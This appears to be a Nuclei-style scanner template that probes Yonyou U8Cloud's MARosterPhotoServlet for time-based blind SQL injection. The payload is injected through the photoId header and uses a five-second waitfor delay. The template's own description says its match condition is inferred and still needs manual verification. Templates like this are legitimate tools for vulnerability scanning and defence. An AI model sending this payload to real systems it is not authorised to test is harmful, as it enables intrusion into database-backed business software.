id: poc-1340242688
info:
  name: 用友U8Cloud MARosterPhotoServlet存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,unknown
http:
- raw:
  - 'GET /servlet/~uap/com.yonyou.ma.roster.servlet.MARosterPhotoServlet?pageId=login HTTP/1.0

    accountcode: U8cloud

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,

    like Gecko) Chrome/91.0.4472.77 Safari/537.36

    type: pid

    photoId: 1'';waitfor delay''0:0:5''-- Alks'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
